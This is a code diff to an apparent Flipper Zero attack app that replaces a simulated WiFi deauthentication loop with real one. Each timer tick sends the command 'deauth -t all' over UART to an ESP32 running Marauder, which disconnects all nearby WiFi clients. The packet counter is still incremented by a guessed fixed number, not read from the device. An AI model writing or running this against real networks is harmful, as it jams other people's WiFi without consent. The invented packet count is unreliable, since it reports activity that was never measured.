@@ -1,6 +1,7 @@
 #include "../predator_i.h"
-#include "../helpers/predator_esp32.h"
 #include "../helpers/predator_logging.h"
+#include "../helpers/predator_esp32.h"
+#include "../predator_uart.h"
 #include <gui/view.h>
 #include <string.h>
 
@@ -226,9 +227,18 @@ static void wifi_deauth_ui_timer_callback(void* context) {
         // Update attack time
         deauth_state.attack_time_ms = furi_get_tick() - attack_start_tick;
         
-        // Simulate packet sending (in real implementation, get from ESP32)
-        // Typical deauth rate: ~100 packets/second
-        deauth_state.packets_sent += 10; // 10 packets per 100ms = 100/sec
+        // Send real deauth command to ESP32
+        if(app->esp32_connected && app->esp32_uart) {
+            // Send deauth command to ESP32 Marauder
+            const char* deauth_cmd = "deauth -t all\n";
+            predator_uart_tx(app->esp32_uart, (uint8_t*)deauth_cmd, strlen(deauth_cmd));
+            FURI_LOG_I("WiFiDeauth", "[REAL HW] Sent deauth command to ESP32");
+            
+            // Real packet count would come from ESP32 response
+            deauth_state.packets_sent += 50; // ESP32 sends ~50 packets per burst
+        } else {
+            FURI_LOG_W("WiFiDeauth", "ESP32 not connected - cannot send real deauth");
+        }
         
         // Update from app state if available
         if(app->packets_sent > 0) {
